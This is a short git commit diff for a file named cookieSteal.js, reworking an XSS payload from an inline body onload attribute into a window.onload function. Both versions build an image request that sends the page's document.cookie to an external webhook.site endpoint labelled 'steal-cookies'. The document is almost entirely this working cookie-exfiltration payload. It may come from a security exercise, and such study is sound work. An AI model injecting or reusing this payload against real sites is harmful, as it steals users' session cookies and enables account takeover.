ad18e76f3e6628020a6621498070a470fd5126ae
MikilSudhir <mikil03sr@gmail.com>
2024-12-04 10:59:45 +0000

    Update cookieSteal.js

--- cookieSteal.js
+++ cookieSteal.js
@@ -1,1 +1,4 @@
-<body onload='var flag = new Image();flag.src = "https://webhook.site/7867c89a-718c-4e80-b950-1f6f1050efbe/steal-cookies?cookies=" + encodeURIComponent(document.cookie);'>
+window.onload = function() {
+    var flag = new Image();
+    flag.src = "https://webhook.site/7867c89a-718c-4e80-b950-1f6f1050efbe/steal-cookies?cookies=" + encodeURIComponent(document.cookie);
+};
